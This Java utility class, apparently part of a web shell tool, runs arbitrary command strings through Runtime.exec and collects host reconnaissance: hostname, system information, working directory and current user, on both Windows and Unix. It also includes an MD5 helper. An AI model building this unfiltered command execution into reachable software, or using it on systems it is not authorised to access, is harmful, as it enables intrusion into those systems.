package utils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;

public class WSHUtils {


	protected static List<Command> getInfo(){

		List<Command> info = new ArrayList<Command>();
		String OS = System.getProperty("os.name").toLowerCase();


		info.add(new Command("hostname", execute("hostname", false)));

		if(OS.contains("win")) 
		{
			//TODO
			info.add(new Command("systeminfo", execute("systeminfo", false)));
			info.add(new Command("cd", execute("cd",false)));
			info.add(new Command("echo %USERDOMAIN%\\%USERNAME%", execute("echo %USERDOMAIN%\\%USERNAME%",false)));
		}
		else
		{
			info.add(new Command("uname -a", execute("uname -a", false)));
			info.add(new Command("pwd", execute("pwd",false)));
			info.add(new Command("whoami", execute("whoami",false)));
		}
		return info;
	}

	protected static String execute(String command, boolean space) {
		String output = "";
		if (command != null) {
			String s = null;
			try {
				Process p = Runtime.getRuntime().exec(command, null, null);
				BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
				while ((s = sI.readLine()) != null) {
					if(space)
						output += s + "\n";
					else
						output += s;
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return output;
	}

	protected static String getMd5(String input) 
	{ 
		try { 
			MessageDigest md = MessageDigest.getInstance("MD5"); 
			byte[] messageDigest = md.digest(input.getBytes()); 
			BigInteger no = new BigInteger(1, messageDigest);
			String hashtext = no.toString(16); 
			while (hashtext.length() < 32) { 
				hashtext = "0" + hashtext; 
			} 
			return hashtext; 
		}
		catch (NoSuchAlgorithmException e) { 
			throw new RuntimeException(e); 
		} 
	} 

}
